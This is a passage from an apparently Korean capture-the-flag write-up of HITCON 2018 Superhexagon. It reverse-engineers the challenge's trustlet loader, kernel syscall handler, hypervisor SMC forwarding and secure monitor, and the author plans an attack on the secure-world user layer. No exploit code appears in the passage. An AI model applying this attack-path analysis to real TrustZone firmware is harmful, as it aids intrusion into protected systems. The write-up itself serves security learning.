</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00000f</span>c8 f5  ff  ff  <span style="color:#ae81ff">17</span>    b          FUN_00000f9c                                     undefined <span style="color:#a6e22e">FUN_00000f9c</span>(undefined
</span></span><span style="display:flex;"><span>                             <span style="color:#f92672">--</span> Flow Override: <span style="color:#a6e22e">CALL_RETURN</span> (CALL_TERMINATOR)
</span></span></code></pre></div><p>그리고 마지막으로 여기서 world switch를 수행한다.
FUN_00000f9c에선 general purpose register 불러오고 eret을 수행한다.</p>
<p>아무리 봐도 악용할만한 취약점이 보이지 않았다.
그래서 S-EL0 부터 공격하기로 결정했다.</p>
<h2 id="analyzing-the-interaction-between-the-normal-world-and-the-secure-world">Analyzing the Interaction Between the Normal World and the Secure World<a hidden class="anchor" aria-hidden="true" href="#analyzing-the-interaction-between-the-normal-world-and-the-secure-world">#</a></h2>
<h3 id="el0-review">EL0 review<a hidden class="anchor" aria-hidden="true" href="#el0-review">#</a></h3>
<p>다시 EL0로 돌아가서 어떻게 처리되는지를 봐야한다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">load_trustlet</span>(byte <span style="color:#f92672">*</span>param_1,<span style="color:#66d9ef">int</span> size)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  ...
</span></span><span style="display:flex;"><span>  iVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">tc_init_trustlet</span>(iVar1,size);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (iVar1 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>    pTVar3 <span style="color:#f92672">=</span> (TCI <span style="color:#f92672">*</span>)<span style="color:#a6e22e">mmap</span>((<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>,<span style="color:#ae81ff">0x1000</span>,<span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    uVar2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">tc_register_wsm</span>(pTVar3,<span style="color:#ae81ff">0x1000</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (uVar2 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0xffffffff</span>) {
</span></span><span style="display:flex;"><span>      tci_buf <span style="color:#f92672">=</span> pTVar3;
</span></span><span style="display:flex;"><span>      tci_handle <span style="color:#f92672">=</span> uVar2;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  ...
</span></span></code></pre></div><p>위와 같은 방식으로 초기화를 했었고 TA_bin이라는 이상한 바이너리를 넘겼었다.
<img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/c9c79ed8ed15d70737ce52b89dbfd0e1.png" alt=""  />
</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">load_key</span>(<span style="color:#66d9ef">int</span> x,<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>buf)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  ...
</span></span><span style="display:flex;"><span>  tci_buf<span style="color:#f92672">-&gt;</span>cmd <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>;
</span></span><span style="display:flex;"><span>  tci_buf<span style="color:#f92672">-&gt;</span>index <span style="color:#f92672">=</span> x;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">tc_tci_call</span>(tci_handle);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (tci_buf<span style="color:#f92672">-&gt;</span>cmd <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>  ...
</span></span></code></pre></div><p>위와 같이 tci_call로 키를 save, load를 했었다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>                             <span style="color:#f92672">*************************************************************</span>
</span></span><span style="display:flex;"><span>                             <span style="color:#f92672">*</span>                           FUNCTION                          
</span></span><span style="display:flex;"><span>                             <span style="color:#f92672">*************************************************************</span>
</span></span><span style="display:flex;"><span>                             undefined  <span style="color:#a6e22e">tc_init_trustlet</span> ()
</span></span><span style="display:flex;"><span>             undefined         w0:<span style="color:#ae81ff">1</span>           <span style="color:#f92672">&lt;</span>RETURN<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>                             tc_init_trustlet                                XREF[<span style="color:#ae81ff">2</span>]<span style="color:#f92672">:</span>     Entry <span style="color:#a6e22e">Point</span> (<span style="color:#f92672">*</span>) , 
</span></span><span style="display:flex;"><span>                                                                                          load_trustlet:<span style="color:#ae81ff">004001</span><span style="color:#ae81ff">9</span>c (c)   
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00401</span>b74 a8  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">80</span>  d2    mov        x8,<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0x5</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00401</span>b78 <span style="color:#ae81ff">08</span>  e0  bf  f2    movk       x8,<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0xff00</span> , LSL <span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">16</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00401</span>b7c <span style="color:#ae81ff">01</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  d4    svc        <span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00401</span>b80 c0  <span style="color:#ae81ff">03</span>  <span style="color:#ae81ff">5f</span>  d6    ret
</span></span><span style="display:flex;"><span>                             <span style="color:#f92672">*************************************************************</span>
</span></span><span style="display:flex;"><span>                             <span style="color:#f92672">*</span>                           FUNCTION                          
</span></span><span style="display:flex;"><span>                             <span style="color:#f92672">*************************************************************</span>
</span></span><span style="display:flex;"><span>                             undefined  <span style="color:#a6e22e">tc_register_wsm</span> ()
</span></span><span style="display:flex;"><span>             undefined         w0:<span style="color:#ae81ff">1</span>           <span style="color:#f92672">&lt;</span>RETURN<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>                             tc_register_wsm                                 XREF[<span style="color:#ae81ff">3</span>]<span style="color:#f92672">:</span>     Entry <span style="color:#a6e22e">Point</span> (<span style="color:#f92672">*</span>) , 
</span></span><span style="display:flex;"><span>                                                                                          load_trustlet:<span style="color:#ae81ff">00400174</span> (c) , 
</span></span><span style="display:flex;"><span>                                                                                          load_trustlet:<span style="color:#ae81ff">004001</span>c8 (c)   
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00401</span>b84 <span style="color:#ae81ff">68</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">80</span>  d2    mov        x8,<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0x3</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00401</span>b88 <span style="color:#ae81ff">08</span>  e0  bf  f2    movk       x8,<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0xff00</span> , LSL <span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">16</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00401</span>b8c <span style="color:#ae81ff">01</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  d4    svc        <span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00401</span>b90 c0  <span style="color:#ae81ff">03</span>  <span style="color:#ae81ff">5f</span>  d6    ret
</span></span><span style="display:flex;"><span>                             <span style="color:#f92672">*************************************************************</span>
</span></span><span style="display:flex;"><span>                             <span style="color:#f92672">*</span>                           FUNCTION                          
</span></span><span style="display:flex;"><span>                             <span style="color:#f92672">*************************************************************</span>
</span></span><span style="display:flex;"><span>                             undefined  <span style="color:#a6e22e">tc_tci_call</span> ()
</span></span><span style="display:flex;"><span>             undefined         w0:<span style="color:#ae81ff">1</span>           <span style="color:#f92672">&lt;</span>RETURN<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>                             tc_tci_call                                     XREF[<span style="color:#ae81ff">3</span>]<span style="color:#f92672">:</span>     Entry <span style="color:#a6e22e">Point</span> (<span style="color:#f92672">*</span>) , 
</span></span><span style="display:flex;"><span>                                                                                          load_key:<span style="color:#ae81ff">00400324</span> (c) , 
</span></span><span style="display:flex;"><span>                                                                                          save_key:<span style="color:#ae81ff">004004</span><span style="color:#ae81ff">90</span> (c)   
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00401</span>b94 c8  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">80</span>  d2    mov        x8,<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0x6</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00401</span>b98 <span style="color:#ae81ff">08</span>  e0  bf  f2    movk       x8,<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0xff00</span> , LSL <span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">16</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00401</span>b9c <span style="color:#ae81ff">01</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  d4    svc        <span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00401</span>ba0 c0  <span style="color:#ae81ff">03</span>  <span style="color:#ae81ff">5f</span>  d6    ret
</span></span></code></pre></div><p>위와 같은 x8 값을 갖는다.</p>
<h3 id="el1-review">EL1 review<a hidden class="anchor" aria-hidden="true" href="#el1-review">#</a></h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">FUN_ffffffffc0008ba8</span>(<span style="color:#66d9ef">long</span> param_1)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  ...
</span></span><span style="display:flex;"><span>                usr <span style="color:#f92672">=</span> (undefined <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0xffffffffffffffff</span>;
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>          }
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>            usr <span style="color:#f92672">=</span> (undefined <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0xffffffffffffffff</span>;
</span></span><span style="display:flex;"><span>          }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> ((x8 <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff000000</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xff000000</span>) {
</span></span><span style="display:flex;"><span>          usr <span style="color:#f92672">=</span> (undefined <span style="color:#f92672">*</span>)<span style="color:#a6e22e">FUN_ffffffffc0008a34</span>(x8,x0,x1,x2);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>          usr <span style="color:#f92672">=</span> (undefined <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0xffffffffffffffff</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>   ...
</span></span></code></pre></div><p>위와 같이 따로 처리 로직이 존재한다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>ulong <span style="color:#a6e22e">FUN_ffffffffc0008a34</span>(<span style="color:#66d9ef">long</span> x8,ulong x0,ulong x1,ulong x2)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  ulong uVar1;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">long</span> lVar2;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">long</span> lVar3;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (x8 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xff000005</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ((x0 <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xfff</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>      uVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">secure_monitor_call</span>(<span style="color:#ae81ff">0x83000005</span>,x0 <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffffffff</span>,x1 <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffffffff</span>,<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>      uVar1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xffffffffffffffff</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (x8 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xff000003</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ((x1 <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xfff</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (x1 <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x4001</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ((x0 <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xfff</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>          lVar2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">FUN_ffffffffc0009174</span>(x0);
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">if</span> ((<span style="color:#66d9ef">int</span>)lVar2 <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>            uVar1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xffffffffffffffff</span>;
</span></span><span style="display:flex;"><span>          }
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> (uVar1 <span style="color:#f92672">=</span> x0 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1000</span>; uVar1 <span style="color:#f92672">&lt;</span> x0 <span style="color:#f92672">+</span> x1; uVar1 <span style="color:#f92672">=</span> uVar1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1000</span>) {
</span></span><span style="display:flex;"><span>              lVar3 <span style="color:#f92672">=</span> <span style="color:#a6e22e">FUN_ffffffffc0009174</span>(uVar1);
</span></span><span style="display:flex;"><span>              <span style="color:#66d9ef">if</span> ((<span style="color:#66d9ef">int</span>)lVar3 <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0xffffffffffffffff</span>;
</span></span><span style="display:flex;"><span>              }
</span></span><span style="display:flex;"><span>              <span style="color:#66d9ef">if</span> ((uVar1 <span style="color:#f92672">+</span> lVar2) <span style="color:#f92672">-</span> x0 <span style="color:#f92672">!=</span> lVar3) {
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0xffffffffffffffff</span>;
</span></span><span style="display:flex;"><span>              }
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>            uVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">secure_monitor_call</span>(<span style="color:#ae81ff">0x83000003</span>,lVar2,x1,<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>            uVar1 <span style="color:#f92672">=</span> uVar1 <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffffffff</span>;
</span></span><span style="display:flex;"><span>          }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>          uVar1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xffffffffffffffff</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>        uVar1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xffffffffffffffff</span>;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>      uVar1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xffffffffffffffff</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (x8 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xff000006</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ((x0 <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xfff</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>      uVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">secure_monitor_call</span>(<span style="color:#ae81ff">0x83000006</span>,x0,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>      uVar1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xffffffffffffffff</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>    uVar1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xffffffffffffffff</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> uVar1;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>                             <span style="color:#f92672">*************************************************************</span>
</span></span><span style="display:flex;"><span>                             <span style="color:#f92672">*</span>                           FUNCTION                          
</span></span><span style="display:flex;"><span>                             <span style="color:#f92672">*************************************************************</span>
</span></span><span style="display:flex;"><span>                             undefined  <span style="color:#a6e22e">FUN_ffffffffc0009174</span> ()
</span></span><span style="display:flex;"><span>             undefined         w0:<span style="color:#ae81ff">1</span>           <span style="color:#f92672">&lt;</span>RETURN<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>                             FUN_ffffffffc0009174                            XREF[<span style="color:#ae81ff">5</span>]<span style="color:#f92672">:</span>     FUN_ffffffffc00086e8:ffffffffc00
</span></span><span style="display:flex;"><span>                                                                                          FUN_ffffffffc0008a34:ffffffffc00
</span></span><span style="display:flex;"><span>                                                                                          FUN_ffffffffc0008a34:ffffffffc00
</span></span><span style="display:flex;"><span>                                                                                          FUN_ffffffffc0008ba8:ffffffffc00
</span></span><span style="display:flex;"><span>                                                                                          FUN_ffffffffc0008ba8:ffffffffc00
</span></span><span style="display:flex;"><span>     fffc0009174 <span style="color:#ae81ff">40</span>  <span style="color:#ae81ff">78</span>  <span style="color:#ae81ff">08</span>  d5    at         S1E0R, x0
</span></span><span style="display:flex;"><span>     fffc0009178 <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">74</span>  <span style="color:#ae81ff">38</span>  d5    mrs        x0,par_el1
</span></span><span style="display:flex;"><span>     fffc000917c <span style="color:#ae81ff">01</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">40</span>  <span style="color:#ae81ff">92</span>    and        x1,x0,<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0x1</span>
</span></span><span style="display:flex;"><span>     fffc0009180 <span style="color:#ae81ff">3f</span>  <span style="color:#ae81ff">04</span>  <span style="color:#ae81ff">00</span>  f1    cmp        x1,<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0x1</span>
</span></span><span style="display:flex;"><span>     fffc0009184 c0  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">54</span>    b.eq       LAB_ffffffffc000919c
</span></span><span style="display:flex;"><span>     fffc0009188 <span style="color:#ae81ff">01</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">9</span>e  d2    mov        x1,<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0xf000</span>
</span></span><span style="display:flex;"><span>     fffc000918c e1  ff  bf  f2    movk       x1,<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0xffff</span> , LSL <span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">16</span>
</span></span><span style="display:flex;"><span>     fffc0009190 e1  ff  df  f2    movk       x1,<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0xffff</span> , LSL <span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">32</span>
</span></span><span style="display:flex;"><span>     fffc0009194 <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">01</span>  <span style="color:#ae81ff">8</span>a    and        x0,x0,x1
</span></span><span style="display:flex;"><span>     fffc0009198 c0  <span style="color:#ae81ff">03</span>  <span style="color:#ae81ff">5f</span>  d6    ret
</span></span><span style="display:flex;"><span>                             LAB_ffffffffc000919c                            XREF[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">:</span>     <span style="color:#a6e22e">ffffffffc0009184</span> (j)   
</span></span><span style="display:flex;"><span>     fffc000919c <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">80</span>  <span style="color:#ae81ff">92</span>    mov        x0,<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0x1</span>
</span></span><span style="display:flex;"><span>     fffc00091a0 c0  <span style="color:#ae81ff">03</span>  <span style="color:#ae81ff">5f</span>  d6    ret
</span></span></code></pre></div><p>실질적으로 약간의 넘겨진 메모리 주소 검사를 해주고 모두 secure monitor로 넘긴다.</p>
<h3 id="el2-review">EL2 review<a hidden class="anchor" aria-hidden="true" href="#el2-review">#</a></h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>ulong <span style="color:#a6e22e">FUN_401003d8</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>saved_reg)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (EC_ <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>b00010111) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (x0 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x83000003</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (x1 <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x3c001</span>) {
</span></span><span style="display:flex;"><span>        x0 <span style="color:#f92672">=</span> <span style="color:#a6e22e">SMC_handler</span>(<span style="color:#ae81ff">0x83000003</span>,x1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x40000000</span>);
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>        x0 <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>      x0 <span style="color:#f92672">=</span> <span style="color:#a6e22e">SMC_handler</span>(x0,x1);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><p>IPA → PA를 해주고 Secure monitor로 마저 넘긴다.</p>
<h3 id="s-el3">S-EL3<a hidden class="anchor" aria-hidden="true" href="#s-el3">#</a></h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>world_ctx <span style="color:#f92672">*</span> <span style="color:#a6e22e">FUN_00000330</span>(uint x0,<span style="color:#66d9ef">uint64_t</span> x1,<span style="color:#66d9ef">uint64_t</span> x2,<span style="color:#66d9ef">uint64_t</span> x3)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  ulong uVar1;
</span></span><span style="display:flex;"><span>  world_ctx <span style="color:#f92672">*</span>pwVar2;
</span></span><span style="display:flex;"><span>  ulong non_secure;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  uVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">ret_0</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ((non_secure <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (x0 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x83000002</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (x0 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x83000007</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">save_el1_sysregs</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>        pwVar2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">get_secure_mem</span>(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">restore_sysregs</span>(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">set_spelx</span>(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>        pwVar2<span style="color:#f92672">-&gt;</span>x0 <span style="color:#f92672">=</span> x1;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> pwVar2;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">FUN_00000d28</span>();
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">do_panic</span>();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* tee os initialized */</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">print_log</span>(<span style="color:#f92672">&amp;</span>DAT_00001910);
</span></span><span style="display:flex;"><span>    is_booted <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    tmp.PC <span style="color:#f92672">=</span> x1;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">save_el1_sysregs</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>    pwVar2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">get_secure_mem</span>(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">restore_sysregs</span>(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">set_spelx</span>(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    pwVar2<span style="color:#f92672">-&gt;</span>x0 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>    uVar1 <span style="color:#f92672">=</span> uVar1 <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffffffff</span>;
</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* save non-secure system register */</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">save_el1_sysregs</span>(<span style="color:#ae81ff">1</span>);
